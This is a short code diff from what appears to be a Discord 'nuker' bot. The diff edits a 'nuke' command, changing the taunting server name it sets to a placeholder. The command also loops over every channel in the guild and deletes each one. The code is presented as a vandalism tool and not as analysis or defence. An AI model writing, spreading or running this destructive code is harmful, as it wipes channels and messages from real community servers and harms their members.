@@ -12,7 +12,7 @@ async def on_ready():
 # main commands
 @client.command()
 async def nuke(ctx):
-    await ctx.guild.edit(name="TRASHED BY saint069 (put your name here)")
+    await ctx.guild.edit(name="put your name here)")
     try:
         for channels in ctx.guild.channels:
             await channels.delete()
